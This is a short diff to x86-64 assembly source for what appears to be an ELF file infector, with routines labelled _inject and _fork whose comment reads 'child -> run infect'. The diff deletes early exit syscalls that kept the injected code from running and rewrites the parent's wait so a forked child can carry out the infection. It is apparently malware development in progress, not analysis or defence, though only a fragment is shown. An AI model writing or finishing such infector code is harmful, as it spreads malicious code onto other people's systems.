@@ -18,9 +18,6 @@ _ft_strlen:
 %endif
 
 _inject:
-	mov rax, 60; exit
-	mov rdi, 0
-	syscall
 	pop rsi; pop addr from stack
 	push rdx; save register
 
@@ -31,7 +28,10 @@ _inject:
 
 _wait:; parent -> run prg
 	mov rax, 61; wait
-	mov rdi, 0x0
+	mov rdi, -1 ; any child
+	lea rsi, [rsp-4]
+	xor edx,edx ; options = 0
+	xor r10d,r10d ; rusage = NULL;
 	syscall
 
 	sub rsi, 0x5; sub call instr
@@ -55,10 +55,6 @@ _fork:; child -> run infect
 		mov rdi, 1
 		syscall
 %endif
-	mov rax, 60; exit
-	mov rdi, 0
-	syscall
-
 	sub rsi, 0x5; sub call instr
 
 	sub rsi, [rel entry_inject]
